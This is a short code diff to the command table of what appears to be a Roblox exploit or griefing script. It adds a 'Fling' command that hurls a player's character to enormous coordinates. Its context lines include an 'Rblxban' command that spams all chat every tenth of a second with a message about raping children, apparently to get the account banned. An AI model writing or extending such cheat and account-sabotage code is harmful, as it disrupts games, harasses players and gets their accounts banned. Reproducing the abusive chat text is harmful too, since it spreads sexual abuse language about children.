@@ -460,6 +460,11 @@ local commands = {
         ["Lobby"] = function(args)
                   game:GetService("ReplicatedStorage")["rbxts_include"]["node_modules"].net.out["_NetManaged"].TeleportToLobby:FireServer()
 	end,
+        ["Fling"] = function(args)
+		if Player then
+			Player.character.HumanoidRootPart.CFrame = addvectortocframe(Player.character.HumanoidRootPart.CFrame, vec3(999999999999, 19191919199119191199, 18291938382919199293938381)
+		end
+	end,
         ["Rblxban"] = function(args)
                     while task.wait(0.1) do
                     game:GetService("ReplicatedStorage")["DefaultChatSystemChatEvents"]["SayMessageRequest"]:FireServer("i rape children","All")
